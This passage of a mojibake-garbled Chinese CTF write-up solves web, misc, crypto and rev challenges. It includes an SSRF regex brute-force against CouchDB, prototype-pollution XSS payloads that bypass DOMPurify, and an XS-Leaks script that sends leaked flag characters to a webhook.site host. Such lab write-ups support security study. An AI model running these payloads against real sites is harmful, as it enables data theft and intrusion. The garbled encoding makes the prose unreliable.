test_regex(regex): url = \u0026#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find\u0026#34; data = json.dumps({\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: regex}}}) r = requests.get(f\u0026#34;https://requester.mc.ax/testAPI/?url={urllib.parse.quote(url)}\u0026amp;method=POST\u0026amp;data={urllib.parse.quote(data)}\u0026#34;) return \u0026#34;Something went wrong\u0026#34; in r.text flag = \u0026#34;flag{\u0026#34; while not flag.endswith(\u0026#34;}\u0026#34;): for c in alphabet: check = \u0026#34;^\u0026#34; + flag + c + \u0026#34;.*\u0026#34; if test_regex(check): print(f\u0026#34;found {c} -\u0026gt; {flag}{c}\u0026#34;) flag += c break ä¹Ÿå¯ä»¥æ‹¿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\nâ€”â€”â€”â€”æœ€æ‚²å‚¬çš„è«è¿‡äºä¹‹åæˆ‘ä¹Ÿç”¨dockeråœ¨æœ¬åœ°èµ·äº†ä¸€ä¸ªç¯å¢ƒ ä½†æ˜¯åˆå§‹åŒ–æœ‰é—®é¢˜ï¼Œå¯¼è‡´localhost:5984æ— æ³•è®¿é—®\næˆ‘æœäº†ä¸€ä¸‹ æœ‰ç›¸å…³é—®é¢˜çš„è§£ç­” ä½†éƒ½ä¸æ˜ç¡®â€¦â€¦\nä»è¿™ä¸ªæŠ¥é”™çœ‹ åº”è¯¥æ˜¯è¯´é¢˜ç›®ç›¸å…³çš„éœ€è¦çš„database_does_not_existï¼Œä½†æ˜¯ç”¨äºåˆå§‹åŒ–çš„/_utilsä¹Ÿæ— æ³•è®¿é—®ï¼Œç›´æ¥curl 127.0.0.1:5984ä¹Ÿæ˜¯å¤±è´¥ï¼Œcurl couchdb:5984ä¹Ÿæ˜¯å¤±è´¥ï¼Œå¤„ç†æŠ¥é”™çœŸæ˜¯å¿ƒç´¯\nweb/requester-strikes-back Java was found to not be the future. Can you take down requester again?\næºç å¤„æœ‰ä¸€å¤„ä¿®æ”¹if (urlURI.getHost().toLowerCase().contains(\u0026quot;couchdb\u0026quot;))\nè¿™ä½¿å¾—æˆ‘ä»¬ä¸èƒ½ç”¨ä¹‹å‰çš„Couchdbå¤§å†™çš„æ–¹å¼æ¥ç»•è¿‡ï¼Œä½†æ˜¯\nç»“åˆIncorrect handling of malformed authority component by URIUtils#extractHost\næˆ‘ä»¬åªéœ€è¦æŠŠä¹‹å‰çš„urlæ”¹æˆhttp://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_findå³å¯ï¼ˆè§£æ³•äºŒï¼‰\nè§£æ³•ä¸€ç›´æ¥è·‘å°±è¡Œ ä¸€æ ·èƒ½é€š\nç›¸å…³çš„ä¸€äº›ssrfå‰ç½®çŸ¥è¯†\u0026amp;urlè§£æé—®é¢˜ä»ç„¶å¯ä»¥çœ‹è¿™é‡Œï¼šA New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ğŸŠOrange Tsaiï¼ˆå¥½å‰å®³çš„pptï¼‰\nå‚è€ƒï¼šwp1 wp2\nweb/pastebin-1 Ah, the classic pastebin.\npastebin-1.mc.ax\nAdmin bot\nDownloads - main.rs\npastebinï¼Œç±»ä¼¼ç•™è¨€æ¿çš„æ ·å­ å¯ä»¥å‘è¡¨paste\nç¬¬ä¸€ååº”å°±æ˜¯xssï¼Œè¯•ä¸€ä¸‹alert(1) æˆåŠŸå¼¹çª—\né¢˜ç›®å¦å¤–æä¾›äº†ä¸€ä¸ª/admin-boté¡µé¢ï¼Œ\nè¿™ä¸ªï¼Œå¦¥å¦¥çš„xsså¥½å§ ç›´æ¥xss platformä¸€æŠŠæ¢­ï¼\n***web/pastebin-2-social-edition Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.\npastebin-2-social-edition.mc.ax\nAdmin bot\nè¿™æ¬¡adminbotä¼šç»™è‡ªå·±çš„pasteä¸‹é¢ç•™è¨€å›å¤\næ˜¾ç„¶å•Š è¿˜æ˜¯xssï¼Œä½†æ˜¯ç”¨äº†DOMPurifyï¼Œå¹¶ä¸”è¿™ä¸ªç‰ˆæœ¬ä¹Ÿå¾ˆæ–° ä¹‹å‰çš„ä¸€äº›bugä¹Ÿæ²¡æ³•åˆ©ç”¨ï¼Œå‚è€ƒwp\nçœ‹æºç \næ³¨æ„åˆ°è¿™é‡Œï¼Œå¦‚æœæœ‰é”™è¯¯ å°±ä¼šè®¾ç½®errorContainer.innerHTML = message;ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶error message å°±èƒ½åšåˆ°xssäº†ï¼›è¿™é‡Œåˆ©ç”¨åŸå‹æ±¡æŸ“prototype pollutionï¼Œå³ä½¿DOMPurifyå¯ä»¥é˜»æŒ¡ä¸€äº›xsså¸¸ç”¨çš„æ ‡ç­¾æˆ–è€…å±æ€§ï¼Œä¹Ÿé˜»æ­¢ä¸äº†åŸå‹æ±¡æŸ“\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; æˆ‘ä»¬å¯ä»¥æŠŠerroræ±¡æŸ“æˆä»»æ„å€¼ï¼Œmessageæ±¡æŸ“ä¸ºxsså†…å®¹å’Œpayload\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;error\u0026#34;] = \u0026#34;1\u0026#34;; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;message\u0026#34;] = \u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34;; å½“è¯·æ±‚è¢«è§¦å‘æ—¶ï¼Œerrorå’Œmessageå°±éƒ½æ˜¯æˆ‘ä»¬è‡ªå®šçš„å€¼äº†ï¼›è™½ç„¶DOMPurifyä¼šå¯¹__proto__è¿›è¡Œç§»é™¤ï¼Œä½†æ˜¯å› ä¸ºä¸Šé¢const fieldsetName = decodeURIComponent(fieldset.name);ï¼Œæ‰€ä»¥å†å¯¹__proto__æ¥ä¸€æ‰‹urlencodeå°±èƒ½ç»•è¿‡äº†\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;%255F_proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; ***web/pastebin-3 Boy, there sure are a lot of pastebins. Gotta think of new themes\u0026hellip;\nPlease put a reasonably secure password when making an account\nè¿˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„é¡µé¢ create pasteï¼Œå¢åŠ äº†ä¸€ä¸ªæœç´¢çš„åŠŸèƒ½\nå…ˆçœ‹/viewè·¯ç”±\næˆ‘ä»¬çš„ä¾¿ç­¾ æ€»ä½“ä¼šä»¥ä¸€ä¸ªurlçš„å½¢å¼æ”¾å…¥iframeä¸­ï¼Œæ¥ç€å»çœ‹çœ‹sanbox_urlçš„æ¸²æŸ“æƒ…å†µ\nè€Œäº®ç‚¹æ˜¯ï¼Œæˆ‘ä»¬çš„pasteåˆè¢«ç›´æ¥æ”¾å…¥åå¼•å·ä¸­é—´äº†ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ç±»ä¼¼${alert(1)}çš„ä¸œè¥¿ç›´æ¥å°±å¯ä»¥è·‘jsäº†ï¼\nç°åœ¨æˆ‘ä»¬æœ‰äº†å¯ä»¥æ“ä½œjsä»£ç çš„åœ°æ–¹â€”â€”ä½†æ˜¯è¿™æ˜¯åœ¨sandboxä¸­ï¼Œä¸ä¸»é¡µé¢å¹¶ä¸æ˜¯åŒæºçš„ğŸ¤”\nå†çœ‹çœ‹æ–°åŠ å…¥çš„searchåŠŸèƒ½\nâ€”â€”â€”â€”è¿™é‡Œè¦å…ˆæ’æ’­ä¸€æ¡çŸ¥è¯†äº† XSLeaksï¼ˆæ›´å¤šçš„ç›¸å…³å‚è€ƒé“¾æ¥æ”¾åˆ°åé¢äº†ï¼‰ï¼Œä¸€ä¸ªå¸¸è§çš„xsleakæ”»å‡»è¯¦è§error events\nCross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the webâ€™s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. â€”â€”from XSLeaks wiki\n/searchä½¿ç”¨çš„æ˜¯flaskä¸­çš„flash()æ¶ˆæ¯é—ªç°æ¥å±•ç¤ºæœç´¢çš„ç»“æœï¼Œå®ƒä¼šå­˜å‚¨åœ¨session cookieä¸­ï¼Œå¦‚æœæ¶ˆæ¯æ¯”ä¼šè¯cookieå¤§çš„è¯ä¼šå¯¼è‡´æ¶ˆæ¯é—ªç°é™é»˜å¤±è´¥â€”â€”æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€æ¡ç‰¹æ€§ï¼Œç”¨é•¿é•¿çš„cookieï¼Œå¦‚æœè¯·æ±‚æˆåŠŸ é‚£ä¹ˆéœ€è¦æ˜¾ç¤ºflashæ—¶cookieå°†ä¼šè¶…è¿‡é™åˆ¶æŠ¥é”™ï¼Œè€Œè¯·æ±‚å¤±è´¥ å°±åªæœ‰No results foundçŸ­çŸ­çš„ä¸€æ¡ï¼Œä¸ä¼šæŠ¥400\næˆ‘ä»¬ç”¨XSLeaks wikiä¸Šç»™å‡ºçš„ probeError snippet\nfunction probeError(url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; console.log(\u0026#39;Onload event triggered\u0026#39;); script.onerror = () =\u0026gt; console.log(\u0026#39;Error event triggered\u0026#39;); document.head.appendChild(script); } è™½ç„¶åŒç«™çš„cookiesï¼ˆsame-site cookiesï¼‰é€šå¸¸ä¼šé˜»æ­¢è¿™ç§æƒ…å†µï¼Œä½†ç”±äºé¢˜ä¸­çš„sandboxæ˜¯å­åŸŸï¼Œå¹¶ä¸æ˜¯åŒç«™çš„æƒ…å†µï¼Œæ‰€ä»¥probeErrorå¯ä»¥æ£€æµ‹åˆ°ï¼Œä¸‹é¢æ˜¯è„šæœ¬\nconst alphabet = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; function set() { document.cookie = `a=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` document.cookie = `b=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` } function unset() { document.cookie = `a=; domain=.pastebin-3.mc.ax` document.cookie = `b=; domain=.pastebin-3.mc.ax` } function probeError(url) { return new Promise(resolve =\u0026gt; { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; resolve(false); script.onerror = () =\u0026gt; resolve(true); document.head.appendChild(script); }); } function wait(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } (async () =\u0026gt; { let prefix = \u0026#34;flag{c00k13_b0mb1n6_15_f4k3_vu\u0026#34;; set(); navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded\u0026#39;); while (!prefix.endsWith(\u0026#39;}\u0026#39;)) { for (let i = 0; i \u0026lt; alphabet.length; i++) { let attempt = prefix + alphabet[i]; let subwindow = window.open(\u0026#34;https://pastebin-3.mc.ax/search?query=\u0026#34; + encodeURIComponent(attempt)); await wait(500); subwindow.close(); if (await probeError(\u0026#34;https://pastebin-3.mc.ax/home\u0026#34;)) { navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?\u0026#39; + attempt); unset(); prefix = attempt; break; } } } })(); ä¸ºäº†å¼•å…¥è¿™ä¸ªè„šæœ¬ï¼Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªpaste\n${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)} å…¶ä»–å‡ ä¸ªç‰ˆæœ¬çš„è„šæœ¬ï¼šver2 ver3\nå‚è€ƒï¼šXSLeaks | Side Channel Vulnerabilities on the Web - Detection and Preventio | Flask æ¶ˆæ¯é—ªç°\nweb/wtjs Ya like golf? How about JS golf?\nwtjs.mc.ax | Admin bot\nDownloads: wtjs.tar\nâ€¦â€¦â€¦â€¦â€¦â€¦æœ‰å­—æ•°é™åˆ¶çš„fuckjsï¼Œæˆ‘ä¸ä¼šæ„é€  å¤ªç—›è‹¦äº†\nwpå‚è§ä¸€å¼ google sheet wp2\nä¸å¾—ä¸è¯´ï¼Œè¿™ä¸ªsheetçœŸçš„æ˜¯ç›¸å½“æ¸…æ™°äº†â€¦â€¦ç”¨9å¼ è¡¨ è¯¦ç»†çš„å†™äº†ä¸€ä¸‹åˆ°åº•æ˜¯æ€ä¹ˆæŠŠæœ€ç»ˆçš„payloadç»™æ‹¼å‡ºæ¥çš„ï¼ŒçœŸçš„æ˜¯ç°ä»£ç‰ˆæ´»å­—å°åˆ· ç»äº† æ•°å­—æ°‘å·¥æ˜¯å§ğŸ˜…\nå±å®æ˜¯èšŒåŸ ä½äº†ğŸ˜…\n***web/MdBin Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologiesâ„¢, including React, this pastebin has you covered, with brand-new theming support!\nmdbin.mc.ax\nSubmit to the admin at admin-bot.mc.ax/mdbin; the flag is in a cookie.\nDownloads: mdbin.tar.gz\nå‚è€ƒï¼šwp1 wp2\nç›´æ¥æ”¾å‚è€ƒçš„wpé“¾æ¥å§ï¼Œè¿˜æ˜¯jsåŸå‹æ±¡æŸ“çš„é—®é¢˜ï¼Œä½†æ˜¯ç”±äºæˆ‘å¯¹jsåŸå‹æ±¡æŸ“è¿™ä¸ªé—®é¢˜äº†è§£çš„ä¸å¤Ÿæ·±å…¥ï¼Œä¹Ÿåªèƒ½ç…§çŒ«ç”»è™çš„å¤ç°ï¼Œè¿˜æœ‰å¾ˆå¤šèµ„æ–™éœ€è¦é¢å¤–çš„å»è¡¥å……åœ°çœ‹ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œä¸Šé¢çš„ä¸¤ä¸ªé“¾æ¥é‡Œå†™çš„éƒ½å¾ˆå¥½ï¼\n***web/lazy-admin Looks like another service with no functionality. I hope the admin is doing their job\u0026hellip;\nlazy-admin.mc.ax\nDownloads: lazy-admin.tar.gz\nå‚è€ƒï¼šwp\néš¾ï¼Œæˆ‘ä¸æ‡‚\nmisc/sanity-check I get to write the sanity check challenge! Alright!\nflag{1_l0v3_54n17y_ch3ck_ch4ll5}\nmisc/discord Join the discord! I hear #rules is an incredibly engaging read.\nmisc/compliant-lattice-feline get a flag! nc mc.ax 31443\n*misc/the-substitution-game nc mc.ax 31996\nDownloads: chall.py\nMarkov Algorithmç½¢äº†\nå‚è§ï¼šMarkov Algorithm Online\nmisc/annaBEL-lee sounds from a kingdom by the sea\nThe server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.\nWhat exactly is the server sending? Sometimes it makes a sound, sometimes it doesn\u0026rsquo;t. Plotting it on a chart might help you see something.\nIt might be helpful to turn your sound on, but you\u0026rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enoughâ€”maybe slow it down to get a better idea.\nThis is not audio steganography. Apologies if anyone went down that route.\nnc mc.ax 31845\nncè¿å…¥åæ²¡æœ‰ä»»ä½•å¯è§†çš„å›æ˜¾ï¼Œä½†æ˜¯è—åœ¨äº†å£°éŸ³ä¿¡æ¯é‡Œ\n\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00 å¯¼å‡ºï¼Œæœ‰ä¸¤ç§å€¼ï¼šno bell(\\x00) bell(\\x07)ï¼Œè½¬åŒ–ä¸º0ä¸1\n101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000 æ”¹ä¸ºè«æ–¯ç”µç çš„æ ·å­\n.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.- è§£å¯†\nLETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L) flag{d1ng-d0n9-g0es-th3-anna-b3l}\ncrypto/scissor I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf\nDownloads: encrypt.py\ncrypto/baby I want to do an RSA!\nDownloads: output.txt\nn: 228430203128652625114739053365339856393 e: 65537 c: 126721104148692049427127809839057445790 ä¸€ç‚¹éƒ½ä¸ä¼šcryptoâ€¦â€¦ å…¶å®æŸ¥ä¸€ä¸‹RSA n e cå…¶å®å°±èƒ½åšå‡ºæ¥åé¢çš„ä¸œè¥¿äº†\nRSA decryption using only n e and c ç„¶åå°±ä¼šçŸ¥é“è¿™ä¸ªä¸œè¥¿ Ganapati/RsaCtfToolï¼Œæˆ–è€…è¿™ä¸ªåœ¨çº¿ç½‘ç«™ RSA Cipher\nä¸ºäº†decodeé¦–å…ˆéœ€è¦æ ¹æ®Næ±‚å‡ºä¸¤ä¸ªäº’è´¨çš„på’Œqï¼Œå¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™æ¥åš æ•´æ•°åˆ†è§£å·¥å…·\nä¹‹åå°±å¯ä»¥æ„‰å¿«çš„è§£å¯†äº†ï¼\nrev/wstrings Some strings are wider than normal\u0026hellip;\nDownloads: wstrings\nflag{n0t_al1_str1ngs_ar3_sk1nny}\nrev/bread-making My parents aren\u0026rsquo;t home! Quick, help me make some bread please\u0026hellip; nc mc.ax 31796\nDownloads: bread\nå‚è€ƒï¼šwp2 wp3 wp4\næˆ‘å½“æ—¶çš„æ€è·¯å’Œæƒ³æ³•å¤§è‡´è¿˜æ˜¯å¯¹çš„ï¼Œ~~ï¼ˆè™½ç„¶æ²¡æœ‰åšå‡ºæ¥å§ï¼‰~~è¿™ä¸ªå°±æ˜¯å…ˆæå–å‡ºæ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œç„¶åç”¨é€»è¾‘ åœ¨äº¤äº’æ¨¡å¼ä¸‹ç”¨æ­£ç¡®çš„é¡ºåºè¾“å…¥ å®Œæ•´çš„é¡ºä¸‹æ¥è¿™ä¸ªæµç¨‹ï¼Œæœ€åæ‹¿åˆ°flagï¼Œæœ€åçš„æ­£ç¡®é¡ºåºæ˜¯è¿™æ ·çš„\nadd ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}\nè°ƒè¯•çš„è¿‡ç¨‹æ˜¯linuxä¸‹çš„pyè„šæœ¬\nfrom pwn import * p = remote(\u0026#34;mc.ax\u0026#34;, 31796) p.sendlineafter(\u0026#34;bowl\u0026#34;, \u0026#34;add flour\u0026#34;) p.sendlineafter(\u0026#34;flour has been added\u0026#34;, \u0026#34;add yeast\u0026#34;) p.sendlineafter(\u0026#34;yeast has been added\u0026#34;, \u0026#34;add salt\u0026#34;) p.sendlineafter(\u0026#34;salt has been added\u0026#34;, \u0026#34;add water\u0026#34;) p.sendlineafter(\u0026#34;lumpy dough\u0026#34;, \u0026#34;hide the bowl inside a box\u0026#34;) p.sendlineafter(\u0026#34;to rise\u0026#34;, \u0026#34;wait 3 hours\u0026#34;) p.sendlineafter(\u0026#34;finish the dough\u0026#34;, \u0026#34;work in the basement\u0026#34;) p.sendlineafter(\u0026#34;needs to be baked\u0026#34;, \u0026#34;preheat the toaster oven\u0026#34;) p.sendlineafter(\u0026#34;for 45 minutes\u0026#34;, \u0026#34;set a timer on your phone\u0026#34;) p.sendlineafter(\u0026#34;awfully long time\u0026#34;, \u0026#34;watch the bread bake\u0026#34;) p.sendlineafter(\u0026#34;no time to waste\u0026#34;, \u0026#34;pull the tray out with a towel\u0026#34;) p.sendlineafter(\u0026#34;smoke in the air\u0026#34;, \u0026#34;unplug the fire alarm\u0026#34;) p.sendlineafter(\u0026#34;in another room\u0026#34;, \u0026#34;open the window\u0026#34;) p.sendlineafter(\u0026#34;air rushes in\u0026#34;, \u0026#34;unplug the oven\u0026#34;) p.sendlineafter(\u0026#34;kitchen is a mess\u0026#34;, \u0026#34;wash the sink\u0026#34;) p.sendlineafter(\u0026#34;sink is cleaned\u0026#34;, \u0026#34;clean the counters\u0026#34;) p.sendlineafter(\u0026#34;counters are cleaned\u0026#34;, \u0026#34;flush the bread down the toilet\u0026#34;) p.sendlineafter(\u0026#34;is disposed of\u0026#34;, \u0026#34;get ready to sleep\u0026#34;) p.sendlineafter(\u0026#34;go to sleep\u0026#34;, \u0026#34;close the window\u0026#34;) p.sendlineafter(\u0026#34;window is closed\u0026#34;, \u0026#34;replace the fire alarm\u0026#34;) p.sendlineafter(\u0026#34;alarm is replaced\u0026#34;, \u0026#34;brush teeth and go to bed\u0026#34;) p.interactive() p.close() è¿™ä¸ªè„šæœ¬çš„é€»è¾‘æ˜¯é€šè¿‡breadæ–‡ä»¶å¯¼å‡ºçš„æ–‡æœ¬ï¼Œæ‰¾å‡ºæœ€ç¬¦åˆé€»è¾‘çš„ä¸Šä¸‹æ–‡ ç„¶ååˆ©ç”¨sendlineaferæ¥è§£é¢˜ï¼›å®é™…åšé¢˜çš„è¯ä¸å¯èƒ½åªé 